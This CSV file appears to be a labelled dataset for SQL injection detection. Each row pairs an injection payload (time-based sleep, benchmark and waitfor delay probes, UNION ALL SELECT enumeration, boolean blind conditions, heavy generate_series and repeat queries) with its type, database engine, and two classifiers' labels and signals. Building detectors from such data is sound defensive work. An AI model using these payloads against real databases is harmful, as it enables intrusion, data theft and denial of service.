payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) # tqmr",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1400,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) # tqmr"
1 ) ) as tnhy where 1874 = 1874 and 2858 = 7324#,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1401,boolean_blind,generic,Pattern match: 'and 2858 = 7324' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 ) ) as tnhy where 1874 = 1874 and 2858 = 7324#
-1910' or 2624 = 3371 and 'umoy' = 'umoy,boolean_blind,generic,0.8,AND comparison for blind,KEEP,,boolean_blind,generic,1402,boolean_blind,generic,Pattern match: 'or 2624 = 3371' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-1910' or 2624 = 3371 and 'umoy' = 'umoy
-7293' ) ) ) or 3038 = 3038,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1403,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-7293' ) ) ) or 3038 = 3038
"select sleep ( 5 ) and ( ""%"" = """,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1404,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"select sleep ( 5 ) and ( ""%"" = """
"1' ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,1405,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #"
"1 ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 6786 = 6786",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,1406,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 6786 = 6786"
"1%"" ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1407,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%"" ) ) union all select null,null,null,null,null,null,null,null,null#"
1' ) as twny where 9580 = 9580,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1408,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) as twny where 9580 = 9580
"-7738%"" ) union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1409,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7738%"" ) union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#"
"1' ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( 'bvdw' = 'bvdw",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1410,boolean_blind,mysql,generic SQL keywords without specific signal,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( 'bvdw' = 'bvdw"
"-3884"" where 8012 = 8012 union all select 8012,8012#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1411,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3884"" where 8012 = 8012 union all select 8012,8012#"
select sleep ( 5 ) and ( ( 'srfc' like 'srfc,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1412,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,select sleep ( 5 ) and ( ( 'srfc' like 'srfc
1 ) waitfor delay '0:0:5' and ( 2993 = 2993,time_blind,mssql,0.9,waitfor delay for time blind,KEEP,,time_blind,mssql,1413,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1 ) waitfor delay '0:0:5' and ( 2993 = 2993
